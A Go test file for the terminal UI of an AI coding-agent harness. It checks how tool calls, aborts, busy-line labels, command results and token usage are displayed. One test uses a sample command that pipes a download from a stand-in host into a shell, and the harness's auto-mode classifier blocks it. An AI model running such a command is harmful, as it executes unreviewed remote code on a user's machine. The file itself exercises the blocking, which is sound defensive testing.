package tui

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/andrepato/harness/internal/claude/permission"
	"github.com/andrepato/harness/internal/harness"
	"github.com/andrepato/harness/internal/msg"
)

// waitForOneSent polls f.snapshot() until at least one message has been
// sent, or fails after a short deadline — handleEvent's Send/Commit calls
// land on the bridge's own committer goroutine, not the caller's.
func waitForOneSent(t *testing.T, f *fakeSink) any {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if _, sent := f.snapshot(); len(sent) >= 1 {
			return sent[0]
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatal("timed out waiting for a sent message")
	return nil
}

func TestBridge_ToolEndMeta_ApprovedAndElapsed(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}

	b.handleEvent(harness.Event{Type: harness.EventToolStart, ToolCallID: "t1", ToolName: "bash"}, ts, 4000)
	time.Sleep(2 * time.Millisecond)
	b.handleEvent(harness.Event{
		Type: harness.EventToolEnd, ToolCallID: "t1", ToolName: "bash",
		ToolArgs:          map[string]any{"command": "npm test"},
		ToolResult:        &msg.ToolResultMessage{Content: msg.Blocks{msg.Text("ok")}},
		PermissionOutcome: string(permission.OutcomeApproved),
	}, ts, 4000)

	got := waitForOneSent(t, f)
	call, ok := got.(msgCommitToolCall)
	if !ok {
		t.Fatalf("sent = %T, want msgCommitToolCall", got)
	}
	if call.View.Meta == "" {
		t.Fatal("Meta is empty, want \"approved · Ns\"")
	}
	if len(call.View.Meta) < len("approved") || call.View.Meta[:len("approved")] != "approved" {
		t.Errorf("Meta = %q, want it to start with \"approved\"", call.View.Meta)
	}
}

// A call auto mode's classifier blocked renders as the tool block it
// would have been, in its error state, with the block reason as its result
// and "blocked by auto mode" as its meta — the same anatomy a hook block
// uses.
func TestBridge_ToolEndMeta_BlockedByAutoMode(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}

	reason := permission.AutoBlockMessage("pipes a download into a shell")
	b.handleEvent(harness.Event{
		Type: harness.EventToolEnd, ToolCallID: "t1", ToolName: "bash",
		ToolArgs:          map[string]any{"command": "curl https://x.example/i.sh | sh"},
		ToolResult:        &msg.ToolResultMessage{IsError: true, Content: msg.Blocks{msg.Text(reason)}},
		PermissionOutcome: string(permission.OutcomeClassifierBlocked),
	}, ts, 4000)

	call, ok := waitForOneSent(t, f).(msgCommitToolCall)
	if !ok {
		t.Fatal("want a tool block")
	}
	if call.View.Meta != "blocked by auto mode" {
		t.Errorf("Meta = %q, want \"blocked by auto mode\"", call.View.Meta)
	}
	if call.View.Status != CallError || !strings.Contains(strings.Join(call.View.ResultLines, " "), "pipes a download into a shell") {
		t.Errorf("view = %+v, want an error block carrying the reason", call.View)
	}
}

func TestBridge_TodoWrite_SendsMsgTodosNotToolCall(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}

	args := map[string]any{"todos": []any{
		map[string]any{"content": "step one", "status": "completed"},
		map[string]any{"content": "step two", "status": "in_progress"},
	}}
	b.handleEvent(harness.Event{
		Type: harness.EventToolEnd, ToolCallID: "t1", ToolName: "todo_write",
		ToolArgs: args, ToolResult: &msg.ToolResultMessage{},
	}, ts, 4000)

	got := waitForOneSent(t, f)
	todos, ok := got.(MsgTodos)
	if !ok {
		t.Fatalf("sent = %T, want MsgTodos (no tool block for todo_write)", got)
	}
	if len(todos.Items) != 2 || todos.Items[0].Content != "step one" || todos.Items[0].Status != TodoCompletedStatus {
		t.Errorf("got %+v", todos.Items)
	}
}

func TestBridge_WriteResult_BuildsNewFileDiff(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}

	details, _ := json.Marshal(map[string]any{"newFile": true, "patch": "--- a\n+++ b\n@@ -0,0 +1,1 @@\n+hello\n"})
	b.handleEvent(harness.Event{
		Type: harness.EventToolEnd, ToolCallID: "t1", ToolName: "write",
		ToolArgs:   map[string]any{"path": "new.txt"},
		ToolResult: &msg.ToolResultMessage{Content: msg.Blocks{msg.Text("ok")}, Details: details},
	}, ts, 4000)

	got := waitForOneSent(t, f)
	call, ok := got.(msgCommitToolCall)
	if !ok {
		t.Fatalf("sent = %T, want msgCommitToolCall", got)
	}
	if call.View.Diff == nil {
		t.Fatal("write result should carry a Diff")
	}
	if !call.View.Diff.NewFile {
		t.Error("Diff.NewFile should be true")
	}
}

// --- Esc-abort vs the aborted call's own EventToolEnd --------------------

// TestBridge_AbortThenToolEnd_CommitsOnlyOnce covers the ordering finding
// 2 actually reproduces: finishTurn's StatusAborted path calls
// InFlightTools() before the interrupted call's own "Command aborted"
// EventToolEnd has been processed. InFlightTools must mark the call so
// that later EventToolEnd is a no-op, not a second committed block.
func TestBridge_AbortThenToolEnd_CommitsOnlyOnce(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}
	b.ts = ts

	b.handleEvent(harness.Event{Type: harness.EventToolStart, ToolCallID: "t1", ToolName: "bash"}, ts, 4000)

	// Esc's abort path runs first: the call is still in flight.
	views := b.InFlightTools()
	if len(views) != 1 {
		t.Fatalf("InFlightTools = %d views, want 1", len(views))
	}

	// The call's own "Command aborted" EventToolEnd arrives afterward,
	// racing the abort.
	b.handleEvent(harness.Event{
		Type: harness.EventToolEnd, ToolCallID: "t1", ToolName: "bash",
		ToolArgs:   map[string]any{"command": "sleep 5"},
		ToolResult: &msg.ToolResultMessage{Content: msg.Blocks{msg.Text("Command aborted")}, IsError: true},
	}, ts, 4000)

	time.Sleep(20 * time.Millisecond) // give the committer goroutine a chance to send anything, if it were going to
	printed, sent := f.snapshot()
	if len(printed)+len(sent) != 0 {
		t.Fatalf("EventToolEnd after InFlightTools committed the same id again: printed=%v sent=%v", printed, sent)
	}
	if len(ts.toolStarts) != 0 {
		t.Error("toolStarts entry for the aborted call was not cleaned up")
	}
}

// TestBridge_ToolEndThenAbort_NoDuplicateInFlight covers the normal
// ordering: the aborted call's own EventToolEnd is processed (and
// committed) before finishTurn ever calls InFlightTools. InFlightTools
// must not report a call that has already ended.
func TestBridge_ToolEndThenAbort_NoDuplicateInFlight(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}
	b.ts = ts

	b.handleEvent(harness.Event{Type: harness.EventToolStart, ToolCallID: "t1", ToolName: "bash"}, ts, 4000)
	b.handleEvent(harness.Event{
		Type: harness.EventToolEnd, ToolCallID: "t1", ToolName: "bash",
		ToolArgs:   map[string]any{"command": "sleep 5"},
		ToolResult: &msg.ToolResultMessage{Content: msg.Blocks{msg.Text("Command aborted")}, IsError: true},
	}, ts, 4000)

	got := waitForOneSent(t, f)
	if _, ok := got.(msgCommitToolCall); !ok {
		t.Fatalf("sent = %T, want msgCommitToolCall", got)
	}

	if views := b.InFlightTools(); len(views) != 0 {
		t.Errorf("InFlightTools = %d views after EventToolEnd already committed, want 0", len(views))
	}
}

// --- Busy-line label verbs (finding 6) -------------------------------------

func TestBusyLabelForToolStart_Verbs(t *testing.T) {
	cases := []struct {
		name string
		tool string
		args map[string]any
		want string
	}{
		{"read", "read", map[string]any{"path": "src/math.js"}, "Reading math.js"},
		{"glob", "glob", map[string]any{"pattern": "*.go"}, "Reading *.go"},
		{"grep", "grep", map[string]any{"pattern": "TODO"}, "Reading TODO"},
		{"tool_search", "tool_search", map[string]any{"query": "select:Read"}, "Reading select:Read"},
		{"web_fetch", "web_fetch", map[string]any{"url": "https://example.com/page"}, "Reading https://example.com/page"},
		{"edit", "edit", map[string]any{"path": "src/math.js"}, "Editing math.js"},
		{"write", "write", map[string]any{"path": "new/deep/file.txt"}, "Writing file.txt"},
		{"todo_write", "todo_write", nil, "Planning"},
		{"mcp tool", "mcp__grafana__query_prometheus", nil, "Running Mcp grafana query prometheus"},
		{"unmapped tool falls back to Running <Name>", "some_custom_tool", nil, "Running Some custom tool"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := busyLabelForToolStart(&turnState{}, harness.Event{ToolName: c.tool, ToolArgs: c.args})
			if got != c.want {
				t.Errorf("busyLabelForToolStart(%q) = %q, want %q", c.tool, got, c.want)
			}
		})
	}
}

// truncateBusyArg's own output carries no "…" marker: RenderSpinnerLeft
// (transcript.go) always appends exactly one trailing "…" to the whole
// busy-line label, truncated or not, so a marker added here too produced a
// double ellipsis in the real busy line ("Running cd /private/tmp/-Us……
// 43s"). See truncateBusyArg's doc comment.
func TestBusyLabelForToolStart_Bash_TruncatesLongCommand(t *testing.T) {
	cmd := "find . -name '*.go' -exec grep -l TODO {} ; # a very long trailing comment"
	got := busyLabelForToolStart(&turnState{}, harness.Event{ToolName: "bash", ToolArgs: map[string]any{"command": cmd}})
	want := "Running " + string([]rune(cmd)[:30])
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
	if strings.Contains(got, "…") {
		t.Errorf("busyLabelForToolStart truncation added its own ellipsis: %q (RenderSpinnerLeft adds the single trailing one)", got)
	}
}

func TestBusyLabelForToolStart_Bash_ShortCommandNotTruncated(t *testing.T) {
	got := busyLabelForToolStart(&turnState{}, harness.Event{ToolName: "bash", ToolArgs: map[string]any{"command": "npm test"}})
	if got != "Running npm test" {
		t.Errorf("got %q, want %q", got, "Running npm test")
	}
}

// TestBusyLabelForToolStart_Task_CountsLiveSubagents covers "task" ->
// "Running a subagent" for the first, in-flight dispatch, then "Running N
// subagents" once a second concurrent dispatch starts before the first
// ends (turnState.tasksInFlight, incremented here and decremented by
// Wire's label subscription on that call's EventToolEnd).
func TestBusyLabelForToolStart_Task_CountsLiveSubagents(t *testing.T) {
	ts := &turnState{}
	if got := busyLabelForToolStart(ts, harness.Event{ToolName: "task"}); got != "Running a subagent" {
		t.Errorf("first task dispatch: got %q, want %q", got, "Running a subagent")
	}
	if got := busyLabelForToolStart(ts, harness.Event{ToolName: "task"}); got != "Running 2 subagents" {
		t.Errorf("second concurrent task dispatch: got %q, want %q", got, "Running 2 subagents")
	}
}

// --- Command-result block, no "⎿" (finding 3) -------------------------

// TestRenderCommandResult_RowsAlignUniformly checks every row (including
// the first) gets the same continuationIndent prefix, so a command's own
// pre-aligned key/value columns (e.g. /status's "model     x", "auth
// y") stay aligned instead of zig-zagging under a "⎿ " glyph that only
// ever prefixed the first row.
// *qa/findings/20260927T000712Z-command-output-elbow-misaligned.json*.
func TestRenderCommandResult_RowsAlignUniformly(t *testing.T) {
	lines := []string{
		"model     faux/faux-1",
		"auth      configured",
		"tier      default",
	}
	out := RenderCommandResult("status", lines, 80)
	if len(out) != len(lines)+1 {
		t.Fatalf("got %d rows, want %d (label rule + %d content rows)", len(out), len(lines)+1, len(lines))
	}
	if !strings.Contains(stripANSI(out[0]), "status") {
		t.Fatalf("first row should be the \"status\" label rule: %q", out[0])
	}
	if strings.Contains(strings.Join(out, "\n"), "⎿") {
		t.Fatalf("command-result block must not use \"⎿\":\n%s", strings.Join(out, "\n"))
	}
	// Every content row's visible prefix (before the value it carries)
	// starts at the same column — the exact bug: the old form indented row
	// 0 by len(resultIndent+glyph+"  ") and every other row by only
	// len(continuationIndent), so "model" and "auth" landed in different
	// columns.
	prefixLen := func(s string) int {
		return len(s) - len(strings.TrimLeft(stripANSI(s), " "))
	}
	first := prefixLen(out[1])
	for i, row := range out[1:] {
		if got := prefixLen(row); got != first {
			t.Errorf("row %d indent = %d, want %d (same as every other content row):\n%s", i+1, got, first, strings.Join(out, "\n"))
		}
	}
}

// TestRenderCommandResult_LongPathRowKeepsTailNotHead checks a row whose
// value is a long path left-truncates the path (keeping the file/dir name
// at the end) instead of right-truncating the whole row (which would hide
// the name behind a trailing "…"), matching /status's "sessions  <path>"
// and /memory's "user  <path>" rows.
// *qa/findings/20261004T205021Z-paths-truncated-at-tail.json*.
func TestRenderCommandResult_LongPathRowKeepsTailNotHead(t *testing.T) {
	path := "/private/tmp/claude-501/-Users-andrepato-projects-harness/scratchpad/qa/work/linkshort/CLAUDE.md"
	lines := []string{"user    " + path}
	out := RenderCommandResult("memory", lines, 60)
	row := stripANSI(out[1])
	if !strings.HasSuffix(row, "CLAUDE.md") {
		t.Fatalf("expected row to keep the trailing file name, got %q", row)
	}
	if !strings.Contains(row, "…") {
		t.Fatalf("expected a cut marker, got %q", row)
	}
	if strings.Contains(row, path) {
		t.Fatalf("row should have been shortened, got the full path: %q", row)
	}
}

// TestRenderCommandResult_EmptyNameFallsBackToResult checks a command
// result with no Name (should not happen once registry.go's Execute fills
// it in, but a defensive default reads better than a blank label rule).
func TestRenderCommandResult_EmptyNameFallsBackToResult(t *testing.T) {
	out := RenderCommandResult("", []string{"one line"}, 80)
	if !strings.Contains(stripANSI(out[0]), "result") {
		t.Fatalf("empty name should fall back to \"result\": %q", out[0])
	}
}

// TestBridge_CommitCommandResult_NoElbowGlyph drives the real committed
// block through the bridge's queue (not just the pure renderer), checking
// the printed text carries no "⎿" and is tagged as a synthetic for Ctrl+O
// replay (CommitCommandResult must go through CommitSynthetic, same as
// every other block with no session entry of its own).
func TestBridge_CommitCommandResult_NoElbowGlyph(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)

	b.CommitCommandResult("status", []string{"model     faux/faux-1", "auth      configured"})

	deadline := time.Now().Add(2 * time.Second)
	var printed []string
	for time.Now().Before(deadline) {
		if printed, _ = f.snapshot(); len(printed) >= 1 {
			break
		}
		time.Sleep(time.Millisecond)
	}
	if len(printed) == 0 {
		t.Fatal("timed out waiting for the command-result block to commit")
	}
	joined := strings.Join(printed, "\n")
	if strings.Contains(joined, "⎿") {
		t.Fatalf("committed command-result block still uses \"⎿\":\n%s", joined)
	}
	if !strings.Contains(joined, "status") {
		t.Fatalf("committed block missing its \"status\" label:\n%s", joined)
	}
	if syn := b.Synthetics(); len(syn) != 1 {
		t.Fatalf("CommitCommandResult should record exactly one synthetic (for Ctrl+O replay), got %d", len(syn))
	}
}

// TestBridge_UsageContextCountsCachedTokens: the context meter counts every
// token the request carried. It summed only uncached input and output, so
// once the conversation was served from the prompt cache (2 uncached input
// tokens, 47k cache-read) the footer read 0%
// (qa/findings *context-meter-ignores-cache).
func TestBridge_UsageContextCountsCachedTokens(t *testing.T) {
	b := NewBridge("/tmp")
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	ts := &turnState{toolStarts: map[string]toolStart{}}

	b.handleEvent(harness.Event{Type: harness.EventUsage, UsageRow: &msg.Usage{Input: 2, CacheRead: 47336, CacheWrite: 346, Output: 281}}, ts, 4000)

	got, ok := waitForOneSent(t, f).(MsgUsage)
	if !ok || got.ContextUsed == nil {
		t.Fatalf("sent %#v, want MsgUsage with ContextUsed", got)
	}
	if want := 2 + 47336 + 346 + 281; *got.ContextUsed != want {
		t.Errorf("ContextUsed = %d, want %d (cached tokens are in context too)", *got.ContextUsed, want)
	}
	// The busy line reads the same figure; it showed "30 tokens" six
	// minutes into a cached session (qa/findings *busy-line-token-figure).
	if got.Tokens == nil || *got.Tokens != *got.ContextUsed {
		t.Errorf("Tokens = %v, want the context figure %d", got.Tokens, *got.ContextUsed)
	}
	if ts.lastContext != *got.ContextUsed {
		t.Errorf("lastContext = %d, want %d so streaming grows from it", ts.lastContext, *got.ContextUsed)
	}
}

// TestBusyLabel_MultiLineBashStaysOneLine: a multi-line command put its
// newline into the busy label, breaking the row and starting the rest at
// column 0 (qa/findings *busy-line-multiline-command).
func TestBusyLabel_MultiLineBashStaysOneLine(t *testing.T) {
	label := busyLabelForToolStart(nil, harness.Event{ToolName: "bash", ToolArgs: map[string]any{
		"command": "H='http://localhost:8080'\ncurl -s $H/api/tasks",
	}})
	if strings.ContainsAny(label, "\n\r\t") {
		t.Fatalf("busy label %q contains a line break or tab", label)
	}
	if !strings.HasPrefix(label, "Running H='http://localhost:8080' curl") {
		t.Errorf("busy label = %q, want the command joined onto one line", label)
	}
}

// TestSkipLeadingCd: the busy line names the command, not the directory a
// leading cd moves to (qa/findings *busy-line-shows-cd-path).
func TestSkipLeadingCd(t *testing.T) {
	cases := map[string]string{
		"cd /a/b/c && npm run build":          "npm run build",
		"cd '/a b' && cd api; go test ./...":  "go test ./...",
		"go test ./...":                       "go test ./...",
		"cd /a/b":                             "cd /a/b",
		"cd /a && ":                           "cd /a && ",
		"cdx /a && ls":                        "cdx /a && ls",
		"cd api && go vet ./... && go test .": "go vet ./... && go test .",
	}
	for in, want := range cases {
		if got := skipLeadingCd(in); got != want {
			t.Errorf("skipLeadingCd(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestHookNotice_RewriteStaysOutOfTranscript: a hook's input rewrite is
// logged, not committed; a hook's own message still is.
func TestHookNotice_RewriteStaysOutOfTranscript(t *testing.T) {
	b := NewBridge(t.TempDir())
	defer b.Stop()
	f := &fakeSink{}
	b.setSink(f)
	b.HookNotice("rewrote bash: rtk go build ./...")
	time.Sleep(20 * time.Millisecond)
	if printed, sent := f.snapshot(); len(printed)+len(sent) != 0 {
		t.Fatalf("rewrite notice committed: printed=%v sent=%v", printed, sent)
	}
	b.HookNotice("lint hook: 2 warnings")
	deadline := time.Now().Add(time.Second)
	for {
		if printed, sent := f.snapshot(); len(printed)+len(sent) > 0 {
			return
		}
		if time.Now().After(deadline) {
			t.Fatal("a hook's own message was not committed")
		}
		time.Sleep(10 * time.Millisecond)
	}
}
